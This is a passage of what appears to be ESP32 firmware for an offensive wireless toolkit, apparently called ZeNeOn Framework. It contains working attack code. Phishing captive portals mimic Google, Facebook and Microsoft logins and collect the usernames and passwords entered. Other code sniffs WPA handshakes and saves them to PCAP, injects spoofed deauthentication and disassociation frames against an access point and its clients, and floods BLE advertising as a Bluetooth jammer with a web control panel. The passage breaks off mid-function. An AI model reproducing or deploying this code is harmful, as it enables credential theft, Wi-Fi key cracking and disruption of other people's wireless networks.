<button class="secondary" onclick="location.href='/'">← Back to Home</button>
<script>
var btPoll=null;
var startBtJam=function(t){
  fetch('/btjam?time='+t).then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='🔵 Bluetooth Jammer active for '+t+'s';
    document.getElementById('liveCard').classList.remove('hidden');
    addBtLog('🔵 BT Jammer started ('+t+'s)');
    startBtPoll(t);
  });
}
var stopBtJam=function(){
  if(btPoll) clearInterval(btPoll);
  fetch('/stopbtjam').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Bluetooth Jammer stopped.';
    addBtLog('⬛ Jammer stopped');
  });
}
var addBtLog=function(msg){
  var el=document.getElementById('btLog');
  var d=document.createElement('div');
  d.textContent=msg; el.appendChild(d); el.scrollTop=el.scrollHeight;
}
var startBtPoll=function(totalTime){
  var startT=Date.now();
  if(btPoll) clearInterval(btPoll);
  btPoll=setInterval(function(){
    fetch('/btjamstatus').then(r=>r.json()).then(d=>{
      document.getElementById('btPkts').textContent=d.pkts;
      var elapsed=Math.round((Date.now()-startT)/1000);
      document.getElementById('btTime').textContent=elapsed+'s';
      var remain=Math.max(0,totalTime-elapsed);
      document.getElementById('btRemain').textContent=remain+'s';
      var pct=Math.min(100,Math.round((elapsed/totalTime)*100));
      document.getElementById('btProg').style.width=pct+'%';
      if(!d.active){
        clearInterval(btPoll);
        document.getElementById('status').className='status success';
        document.getElementById('status').innerHTML='✓ Bluetooth Jam complete — '+d.pkts+' packets sent';
        document.getElementById('btProg').style.width='100%';
        addBtLog('✓ Jam complete: '+d.pkts+' packets sent');
      }
    }).catch(function(){});
  },800);
}
</script>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
</div></body></html>
)rawliteral";
}

String captivePortal() {
  String ssid = evilTwinSSID.length() > 0 ? evilTwinSSID : "Free_WiFi";
  String submitJS = R"rawliteral(
<script>
var doLogin=function(e){
  e.preventDefault();
  var u=document.getElementById('u').value,p=document.getElementById('p').value;
  document.getElementById('lo').style.display='flex';
  fetch('/submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p)}).then(function(r){return r.text()}).then(function(){
    setTimeout(function(){
      document.getElementById('stxt').textContent='Authentication Failed';
      document.getElementById('sdtl').textContent='Invalid credentials. Try again.';
      document.getElementById('sdtl').style.color='#c00';
      setTimeout(function(){
        document.getElementById('lo').style.display='none';
        document.getElementById('p').value='';
        document.getElementById('stxt').textContent='Authenticating...';
        document.getElementById('sdtl').textContent='Please wait';
        document.getElementById('sdtl').style.color='#666';
      },2000);
    },1500);
  });
  return false;
}
</script>)rawliteral";

  String loaderCSS = ".lo{display:none;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,0.95);z-index:1000;align-items:center;justify-content:center;flex-direction:column}"
    ".sp{width:36px;height:36px;border:3px solid #ddd;border-top:3px solid #0066cc;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:16px}"
    "@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}"
    ".st{font-weight:600;margin-bottom:6px;color:#333}.sd{font-size:14px;color:#666}";

  String loaderHTML = "<div class='lo' id='lo'><div class='sp'></div><div class='st' id='stxt'>Authenticating...</div><div class='sd' id='sdtl'>Please wait</div></div>";

  switch (portalTemplate) {
    case 1: // Google Sign-In
      return R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,Arial,sans-serif}
body{background:#f0f4f9;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
.box{background:#fff;width:100%;max-width:450px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.12);padding:48px 40px;position:relative}
.logo{text-align:center;margin-bottom:16px;font-size:24px;font-weight:500;color:#202124}
.logo span{color:#4285f4}
.logo .g2{color:#ea4335}.logo .g3{color:#fbbc04}.logo .g4{color:#4285f4}.logo .g5{color:#34a853}.logo .g6{color:#ea4335}
.sub{text-align:center;font-size:16px;color:#202124;margin-bottom:4px;font-weight:400}
.sub2{text-align:center;font-size:14px;color:#5f6368;margin-bottom:28px}
.fg{margin-bottom:24px}
.fg label{display:block;font-size:12px;color:#5f6368;margin-bottom:4px}
.fg input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124}
.fg input:focus{outline:none;border-color:#1a73e8;border-width:2px;padding:12px 14px}
.fl{display:inline-block;font-size:14px;color:#1a73e8;text-decoration:none;margin-bottom:28px;font-weight:500}
.btn{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:500;cursor:pointer}
.btn:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,0.2)}
.ft{margin-top:32px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
.ft a{color:#5f6368;text-decoration:none}
)rawliteral" + loaderCSS + R"rawliteral(
</style></head><body>
<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
<div class="logo"><span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g5">l</span><span class="g6">e</span></div>
<div class="sub">Sign in</div>
<div class="sub2">to continue to )rawliteral" + ssid + R"rawliteral(</div>
<form id="lf" onsubmit="doLogin(event)">
<div class="fg"><input type="text" id="u" name="username" placeholder="Email or phone" required></div>
<div class="fg"><input type="password" id="p" name="password" placeholder="Enter your password" required></div>
<a href="#" class="fl" onclick="return false">Forgot password?</a>
<button type="submit" class="btn">Next</button>
</form>
<div class="ft"><a href="#" onclick="return false">Create account</a><a href="#" onclick="return false">Help</a></div>
</div>)rawliteral" + submitJS + "</body></html>";

    case 2: // Facebook Login
      return R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Log in to Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
body{background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
.wrap{width:100%;max-width:400px}
.logo{text-align:center;margin-bottom:16px}
.logo h1{color:#1877f2;font-size:32px;font-weight:700;letter-spacing:-1px}
.box{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);position:relative}
.fg input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;color:#1d2129}
.fg input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.fg input::placeholder{color:#8a8d91}
.btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
.btn:hover{background:#166fe5}
.sep{text-align:center;margin:16px 0;position:relative}
.sep::before{content:'';position:absolute;left:0;top:50%;right:0;border-top:1px solid #dadde1}
.sep span{background:#fff;padding:0 16px;position:relative;color:#8a8d91;font-size:14px}
.fl{display:block;text-align:center;color:#1877f2;text-decoration:none;font-size:14px;margin-bottom:20px}
.new{display:block;width:fit-content;margin:0 auto;padding:12px 24px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;text-decoration:none}
.ft{text-align:center;margin-top:24px;font-size:12px;color:#8a8d91}
)rawliteral" + loaderCSS + R"rawliteral(
</style></head><body>
<div class="wrap">
<div class="logo"><h1>facebook</h1></div>
<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
<form id="lf" onsubmit="doLogin(event)">
<div class="fg"><input type="text" id="u" name="username" placeholder="Email address or phone number" required></div>
<div class="fg"><input type="password" id="p" name="password" placeholder="Password" required></div>
<button type="submit" class="btn">Log in</button>
</form>
<a href="#" class="fl" onclick="return false">Forgotten password?</a>
<div class="sep"><span>or</span></div>
<a href="#" class="new" onclick="return false">Create new account</a>
</div>
<div class="ft"><p>WiFi requires authentication via )rawliteral" + ssid + R"rawliteral(</p></div>
</div>)rawliteral" + submitJS + "</body></html>";

    case 3: // Microsoft Account
      return R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Sign in to your account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
body{background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
.box{background:#fff;width:100%;max-width:440px;box-shadow:0 2px 6px rgba(0,0,0,0.2);padding:44px;position:relative}
.logo{margin-bottom:16px}
.logo .ms{display:inline-grid;grid-template-columns:11px 11px;gap:2px;vertical-align:middle;margin-right:8px}
.logo .ms div:nth-child(1){background:#f25022;width:11px;height:11px}
.logo .ms div:nth-child(2){background:#7fba00;width:11px;height:11px}
.logo .ms div:nth-child(3){background:#00a4ef;width:11px;height:11px}
.logo .ms div:nth-child(4){background:#ffb900;width:11px;height:11px}
.logo span{font-size:20px;font-weight:600;color:#1b1b1b;vertical-align:middle}
.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
.sub{font-size:13px;color:#1b1b1b;margin-bottom:24px}
.fg{margin-bottom:16px}
.fg input{width:100%;padding:8px 10px;border:none;border-bottom:1px solid #666;font-size:15px;color:#1b1b1b;background:transparent}
.fg input:focus{outline:none;border-bottom-color:#0067b8;border-bottom-width:2px;padding-bottom:7px}
.fg input::placeholder{color:#666}
.fl{font-size:13px;color:#0067b8;text-decoration:none;display:block;margin-bottom:24px}
.btn{padding:9px 16px;background:#0067b8;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer;float:right;min-width:108px}
.btn:hover{background:#005da3}
.ft{clear:both;padding-top:36px;font-size:12px;color:#666}
)rawliteral" + loaderCSS + R"rawliteral(
</style></head><body>
<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
<div class="logo"><div class="ms"><div></div><div></div><div></div><div></div></div><span>Microsoft</span></div>
<div class="title">Sign in</div>
<div class="sub">to access )rawliteral" + ssid + R"rawliteral(</div>
<form id="lf" onsubmit="doLogin(event)">
<div class="fg"><input type="text" id="u" name="username" placeholder="Email, phone, or Skype" required></div>
<div class="fg"><input type="password" id="p" name="password" placeholder="Password" required></div>
<a href="#" class="fl" onclick="return false">Forgot password?</a>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="ft">No account? <a href="#" style="color:#0067b8;text-decoration:none" onclick="return false">Create one!</a></div>
</div>)rawliteral" + submitJS + "</body></html>";

    default: // Generic WiFi Login (template 0)
      return R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Network Authentication</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
.box{background:#fff;width:100%;max-width:420px;border-radius:12px;box-shadow:0 4px 16px rgba(0,0,0,0.1);overflow:hidden;position:relative}
.hd{background:#0066cc;color:#fff;padding:28px 24px;text-align:center}
.hd h1{font-size:22px;font-weight:600;margin-bottom:6px}
.hd p{font-size:14px;opacity:0.9}
.badge{background:rgba(255,255,255,0.2);display:inline-block;padding:5px 12px;border-radius:20px;font-size:12px;margin-top:12px}
.ct{padding:28px 24px}
.notice{background:#e8f4fd;border-left:4px solid #0066cc;padding:12px;margin-bottom:24px;font-size:13px;color:#333;border-radius:4px}
.fg{margin-bottom:18px}
.fg label{display:block;margin-bottom:5px;font-weight:500;font-size:14px;color:#333}
.fg input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:6px;font-size:16px}
.fg input:focus{outline:none;border-color:#0066cc}
.opts{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;font-size:14px}
.rem{display:flex;align-items:center;gap:8px}
.rem input{width:auto}
.fl{color:#0066cc;text-decoration:none}
.btn{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:20px}
.btn:hover{background:#0052a3}
.ft{text-align:center;padding:18px;background:#f5f5f5;font-size:12px;color:#666}
)rawliteral" + loaderCSS + R"rawliteral(
</style></head><body>
<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
<div class="hd"><h1>Network Authentication</h1><p>Secure connection required</p><div class="badge">SSID: )rawliteral" +
         ssid + R"rawliteral(</div></div>
<div class="ct">
<div class="notice"><strong>Security Notice:</strong> Authentication required for internet access.</div>
<form id="lf" onsubmit="doLogin(event)">
<div class="fg"><label>Username or Email</label><input type="text" id="u" name="username" placeholder="Enter username or email" required></div>
<div class="fg"><label>Password</label><input type="password" id="p" name="password" placeholder="Enter password" required></div>
<div class="opts"><label class="rem"><input type="checkbox"> Remember me</label><a href="#" class="fl" onclick="return false">Forgot password?</a></div>
<button type="submit" class="btn">Sign In</button>
</form></div>
<div class="ft"><p>&copy; 2026 Network Services. All rights reserved.</p></div>
</div>)rawliteral" + submitJS + "</body></html>";
  }
}

/* ============ EAPOL / HANDSHAKE ============ */
bool isEAPOLFrame(const uint8_t *payload, uint32_t len) {
  if (len < 36)
    return false;
  // Check LLC/SNAP header for 802.1X Authentication (0x888E)
  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
      payload[30] == 0x88 && payload[31] == 0x8E)
    return true;
  return false;
}

uint8_t getEAPOLMessageType(const uint8_t *payload, uint32_t len) {
  if (len < 99)
    return 0;
  uint16_t keyInfo = (payload[37] << 8) | payload[38];
  bool pairwise = (keyInfo & 0x0008) != 0;
  bool install = (keyInfo & 0x0040) != 0;
  bool ack = (keyInfo & 0x0080) != 0;
  bool mic = (keyInfo & 0x0100) != 0;
  if (pairwise) {
    if (ack && !mic && !install)
      return 1; // M1: AP -> STA (ANonce)
    if (!ack && mic && !install)
      return 2; // M2: STA -> AP (SNonce + MIC)
    if (ack && mic && install)
      return 3; // M3: AP -> STA (ANonce + MIC + Install)
    if (!ack && mic && !install) {
      // Could be M2 or M4. M4 has zero nonce.
      // Nonce offset: 24(MAC) + 8(LLC/SNAP) + 4(EAPOL hdr) + 1(desc) +
      // 2(key_info) + 2(key_len) + 8(replay) = 49
      bool nonceZero = true;
      for (int i = 49; i < 81 && i < (int)len; i++) {
        if (payload[i] != 0) {
          nonceZero = false;
          break;
        }
      }
      if (nonceZero)
        return 4; // M4: STA -> AP (MIC, zero nonce)
      return 2;   // M2 again
    }
  }
  return 0;
}

/* ============ PROMISCUOUS CALLBACK (FIXED) ============ */
void promiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint32_t len = pkt->rx_ctrl.sig_len;
  if (len < 24 || len > 2500)
    return;
  const uint8_t *payload = pkt->payload;
  uint8_t frameType = payload[0] & 0x0C; // 0x00=Mgmt, 0x04=Ctrl, 0x08=Data
  uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;

  bool isCapturing =
      sniffing || capturingHandshake || currentPhase != PHASE_IDLE;
  bool hasTarget = (targetBSSID[0] != 0 || targetBSSID[1] != 0);

  /* --- Client discovery from data and management frames --- */
  if (hasTarget &&
      (deauthing || capturingHandshake || currentPhase != PHASE_IDLE)) {
    // Data frames: extract client MACs
    if (frameType == 0x08) {
      uint8_t toDS = payload[1] & 0x01;
      uint8_t fromDS = payload[1] & 0x02;
      if (toDS && !fromDS && macEquals(&payload[4], targetBSSID))
        addClient(&payload[10]);
      else if (!toDS && fromDS && macEquals(&payload[10], targetBSSID))
        addClient(&payload[4]);
      else if (toDS && fromDS) {
        if (macEquals(&payload[10], targetBSSID))
          addClient(&payload[4]);
        if (macEquals(&payload[4], targetBSSID))
          addClient(&payload[10]);
      }
    }
    // Management frames: extract client MACs
    if (frameType == 0x00 && len >= 22 &&
        macEquals(&payload[16], targetBSSID)) {
      if (!macEquals(&payload[4], targetBSSID) && !isBroadcast(&payload[4]))
        addClient(&payload[4]);
      if (!macEquals(&payload[10], targetBSSID) && !isBroadcast(&payload[10]))
        addClient(&payload[10]);
    }
  }

  /* --- Track beacon frames from target AP --- */
  if (hasTarget && frameType == 0x00) {
    // Beacon (subtype 0x08) or Probe Response (subtype 0x05)
    if (frameSubtype == 0x08 || frameSubtype == 0x05) {
      // addr2 (transmitter) matches target BSSID
      if (macEquals(&payload[10], targetBSSID)) {
        if (!beaconCaptured) {
          Serial.printf("[BEACON] %s frame from target captured!\n",
                        frameSubtype == 0x08 ? "Beacon" : "ProbeResp");
          addEvent("BEACON: First " +
                   String(frameSubtype == 0x08 ? "Beacon" : "ProbeResp") +
                   " from target");
        }
        beaconCaptured = true;
        beaconCount++;
        if (beaconCount % 10 == 0) {
          addEvent("BEACON: " + String(beaconCount) + " beacons captured");
        }
      }
    }
    // Authentication frame (subtype 0x0B)
    if (frameSubtype == 0x0B) {
      if (macEquals(&payload[4], targetBSSID) ||
          macEquals(&payload[10], targetBSSID)) {
        authFrameCount++;
        Serial.printf("[AUTH] Authentication frame detected (%u total)\n",
                      authFrameCount);
      }
    }
    // Association Request (0x00) / Response (0x01) / Reassoc Req (0x02) / Resp
    // (0x03)
    if (frameSubtype <= 0x03) {
      if (macEquals(&payload[4], targetBSSID) ||
          macEquals(&payload[10], targetBSSID)) {
        assocFrameCount++;
        Serial.printf("[ASSOC] Association frame detected (%u total)\n",
                      assocFrameCount);
      }
    }
  }

  /* --- EAPOL detection with per-message tracking --- */
  if (isCapturing && frameType == 0x08) {
    if (isEAPOLFrame(payload, len)) {
      uint8_t msgType = getEAPOLMessageType(payload, len);
      eapolFramesDetected++;

      if (msgType == 1) {
        eapolM1Count++;
        Serial.printf(
            "[EAPOL] ★ M1 (ANonce) | %d bytes | RSSI %d | Total M1: %d\n", len,
            pkt->rx_ctrl.rssi, eapolM1Count);
        addEvent("EAPOL ★ M1 (ANonce) | " + String(len) + "B | RSSI " +
                 String(pkt->rx_ctrl.rssi) + " | #" + String(eapolM1Count));
      } else if (msgType == 2) {
        eapolM2Count++;
        Serial.printf(
            "[EAPOL] ★ M2 (SNonce+MIC) | %d bytes | RSSI %d | Total M2: %d\n",
            len, pkt->rx_ctrl.rssi, eapolM2Count);
        addEvent("EAPOL ★ M2 (SNonce+MIC) | " + String(len) + "B | RSSI " +
                 String(pkt->rx_ctrl.rssi) + " | #" + String(eapolM2Count));
      } else if (msgType == 3) {
        eapolM3Count++;
        Serial.printf(
            "[EAPOL] ★ M3 (Install) | %d bytes | RSSI %d | Total M3: %d\n", len,
            pkt->rx_ctrl.rssi, eapolM3Count);
        addEvent("EAPOL ★ M3 (Install) | " + String(len) + "B | RSSI " +
                 String(pkt->rx_ctrl.rssi) + " | #" + String(eapolM3Count));
      } else if (msgType == 4) {
        eapolM4Count++;
        Serial.printf(
            "[EAPOL] ★ M4 (Confirm) | %d bytes | RSSI %d | Total M4: %d\n", len,
            pkt->rx_ctrl.rssi, eapolM4Count);
        addEvent("EAPOL ★ M4 (Confirm) | " + String(len) + "B | RSSI " +
                 String(pkt->rx_ctrl.rssi) + " | #" + String(eapolM4Count));
      } else {
        Serial.printf("[EAPOL] Unknown key frame | %d bytes | RSSI %d\n", len,
                      pkt->rx_ctrl.rssi);
        addEvent("EAPOL Unknown key frame | " + String(len) + "B");
      }

      // A usable handshake needs M1+M2 (with matching ANonce) or M2+M3
      if ((eapolM1Count > 0 && eapolM2Count > 0) ||
          (eapolM2Count > 0 && eapolM3Count > 0)) {
        if (!handshakeCaptured) {
          Serial.println("\n╔══════════════════════════════════════╗");
          Serial.println("║  ★ WPA HANDSHAKE CAPTURED! ★        ║");
          Serial.printf("║  M1:%d M2:%d M3:%d M4:%d              ║\n",
                        eapolM1Count, eapolM2Count, eapolM3Count, eapolM4Count);
          Serial.println("╚══════════════════════════════════════╝\n");
          addEvent("★★★ WPA HANDSHAKE CAPTURED! M1:" + String(eapolM1Count) +
                   " M2:" + String(eapolM2Count) + " M3:" +
                   String(eapolM3Count) + " M4:" + String(eapolM4Count));
        }
        handshakeCaptured = true;
      }
    }
  }

  /* --- PCAP writing: write ALL frames when capturing --- */
  if (isCapturing && pcapFile) {
    totalPacketsCaptured++;
    unsigned long timestamp = micros();
    pcaprec_hdr_t rec;
    rec.ts_sec = timestamp / 1000000;
    rec.ts_usec = timestamp % 1000000;
    rec.incl_len = len;
    rec.orig_len = len;
    pcapFile.write((uint8_t *)&rec, sizeof(rec));
    pcapFile.write(payload, len);

    // Flush periodically — SPIFFS flush is SLOW (50-200ms), don't do it too
    // often
    static int pktCount = 0;
    if (++pktCount >= 50) {
      pcapFile.flush();
      pktCount = 0;
    }
  }
}

/* ============ DEAUTH FRAME INJECTION ============ */
void sendRawFrame(uint8_t *frame, int len) {
  // Try STA interface first (standard for deauth injection)
  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
  if (result != ESP_OK) {
    // Fallback to AP interface if STA fails
    result = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    if (result != ESP_OK) {
      static unsigned long lastErrLog = 0;
      if (millis() - lastErrLog > 5000) {
        Serial.printf("[ERROR] Frame TX failed on both IF: %s (0x%x)\n",
                      esp_err_to_name(result), result);
        addEvent("ERROR: Frame TX failed: " + String(esp_err_to_name(result)));
        lastErrLog = millis();
      }
    }
  }
  delayMicroseconds(300); // Brief gap for WiFi stack
}

void buildDeauthFrame(uint8_t *pkt, const uint8_t *dest, const uint8_t *src,
                      const uint8_t *bssid, uint8_t type, uint16_t reason) {
  memset(pkt, 0, 26);
  pkt[0] = type; // 0xC0 = Deauth, 0xA0 = Disassoc
  pkt[1] = 0x00;
  pkt[2] = 0x00;
  pkt[3] = 0x00;

  memcpy(&pkt[4], dest, 6);
  memcpy(&pkt[10], src, 6);
  memcpy(&pkt[16], bssid, 6);

  static uint16_t seqNum = 0;
  pkt[22] = (seqNum & 0x0F) << 4;
  pkt[23] = (seqNum >> 4) & 0xFF;
  seqNum = (seqNum + 1) % 4096;

  pkt[24] = reason & 0xFF;
  pkt[25] = (reason >> 8) & 0xFF;
}

void sendDeauthBurst() {
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t pkt[26];
  uint16_t reasons[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07};

  // Broadcast deauth from AP
  for (int r = 0; r < 3; r++) {
    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0,
                     reasons[r]);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
  }
  // Broadcast disassoc
  buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xA0, 0x08);
  sendRawFrame(pkt, 26);
  deauthPktsSent++;

  // Targeted unicast to discovered clients
  for (int i = 0; i < clientCount; i++) {
    // Deauth: AP -> Client
    buildDeauthFrame(pkt, clientMACs[i], targetBSSID, targetBSSID, 0xC0, 0x07);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
    // Disassoc: AP -> Client
    buildDeauthFrame(pkt, clientMACs[i], targetBSSID, targetBSSID, 0xA0, 0x08);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
    // Deauth: Client -> AP (spoofed)
    buildDeauthFrame(pkt, targetBSSID, clientMACs[i], targetBSSID, 0xC0, 0x03);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
    // Disassoc: Client -> AP (spoofed)
    buildDeauthFrame(pkt, targetBSSID, clientMACs[i], targetBSSID, 0xA0, 0x08);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
  }

  // More broadcast with different reasons
  for (int r = 3; r < 7; r++) {
    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0,
                     reasons[r]);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
  }
  yield(); // Let WiFi task breathe so TX actually goes out
}

/* ============ BLUETOOTH JAMMER ============ */
static bool btInitialized = false;
static volatile bool btAdvActive = false;
static volatile bool btScanActive = false;

// BLE advertising parameters (persistent so we can restart quickly)
static esp_ble_adv_params_t btJamAdvParams;
static esp_ble_scan_params_t btJamScanParams;

// GAP event callback — required for BLE stack to function
static void btJamGapCallback(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  switch (event) {
    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
      // Raw advertising data set, start advertising
      esp_ble_gap_start_advertising(&btJamAdvParams);
      break;
    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
      btAdvActive = true;
      break;
    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
      btAdvActive = false;
      break;
    case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT:
      btScanActive = true;
      break;
    case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT:
      btScanActive = false;
      break;
    default:
      break;
  }
}

void btJamInit() {
  if (btInitialized) return;
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  bt_cfg.mode = ESP_BT_MODE_BLE;
  if (esp_bt_controller_init(&bt_cfg) != ESP_OK) {
    Serial.println("[BT] Controller init failed");
    return;
  }
  if (esp_bt_controller_enable(ESP_BT_MODE_BLE) != ESP_OK) {
    Serial.println("[BT] Controller enable failed");
    esp_bt_controller_deinit();
    return;
  }
  if (esp_bluedroid_init() != ESP_OK) {
    Serial.println("[BT] Bluedroid init failed");
    esp_bt_controller_disable();
    esp_bt_controller_deinit();
    return;
  }
  if (esp_bluedroid_enable() != ESP_OK) {
    Serial.println("[BT] Bluedroid enable failed");
    esp_bluedroid_deinit();
    esp_bt_controller_disable();
    esp_bt_controller_deinit();
    return;
  }

  // Register GAP callback — critical, without this advertising silently fails
  esp_ble_gap_register_callback(btJamGapCallback);

  // Set max TX power for all BLE operations
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);

  // Pre-configure advertising params (fastest possible non-connectable)
  memset(&btJamAdvParams, 0, sizeof(btJamAdvParams));
  btJamAdvParams.adv_int_min = 0x0020; // 20ms minimum
  btJamAdvParams.adv_int_max = 0x0020;
  btJamAdvParams.adv_type = ADV_TYPE_NONCONN_IND;
  btJamAdvParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
  btJamAdvParams.channel_map = ADV_CHNL_ALL; // Channels 37, 38, 39
  btJamAdvParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

  // Pre-configure scan params (aggressive active scanning for more RF noise)
  memset(&btJamScanParams, 0, sizeof(btJamScanParams));
  btJamScanParams.scan_type = BLE_SCAN_TYPE_ACTIVE; // Active scan = sends SCAN_REQ
  btJamScanParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
  btJamScanParams.scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL;
  btJamScanParams.scan_interval = 0x0010; // 10ms — very aggressive
  btJamScanParams.scan_window = 0x0010;   // 10ms — continuous scanning
  btJamScanParams.scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE;

  btAdvActive = false;
  btScanActive = false;
  btInitialized = true;
  Serial.println("[BT] Stack initialized (callback + max TX power)");
}

void btJamDeinit() {
  if (!btInitialized) return;
  esp_ble_gap_stop_scanning();
  esp_ble_gap_stop_advertising();
  delay(100); // Give BLE stack time to stop cleanly
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
  btAdvActive = false;
  btScanActive = false;
  btInitialized = false;
  Serial.println("[BT] Bluetooth stack released");
}

void sendBtJamBurst() {
  if (!btInitialized) return;

  // --- BLE Advertising flood ---
  // Each burst: randomize address + data, push raw adv, let it transmit
  for (int burst = 0; burst < 3; burst++) {
    // Randomize BLE source address each burst
    esp_bd_addr_t randAddr;
    for (int i = 0; i < 6; i++) randAddr[i] = (uint8_t)esp_random();
    randAddr[0] |= 0xC0; // Static random address
    esp_ble_gap_stop_advertising();
    delay(2);
    esp_ble_gap_set_rand_addr(randAddr);
    delay(1);

    // Build raw advertising payload with random noise
    uint8_t rawAdv[31];
    for (int i = 0; i < 31; i++) rawAdv[i] = (uint8_t)esp_random();
    // Valid flags header so the packet isn't dropped by the controller
    rawAdv[0] = 0x02; // Length
    rawAdv[1] = 0x01; // Type: Flags
    rawAdv[2] = 0x06; // General Discoverable + BR/EDR Not Supported

    // Use RAW data inject — faster, bypasses struct validation
    esp_ble_gap_config_adv_data_raw(rawAdv, 31);
    // The GAP callback will auto-start advertising when data is set
    delay(25); // Let at least one full advertising event transmit on all 3 channels

    btJamPktsSent++;
  }

  // --- Concurrent BLE scanning ---
  // Active scanning sends SCAN_REQ packets = more RF interference on 2.4GHz
  if (!btScanActive) {
    esp_bd_addr_t scanAddr;
    for (int i = 0; i < 6; i++) scanAddr[i] = (uint8_t)esp_random();
    scanAddr[0] |= 0xC0;
    esp_ble_gap_set_scan_params(&btJamScanParams);
    esp_ble_gap_start_scanning(1); // Scan for 1 second
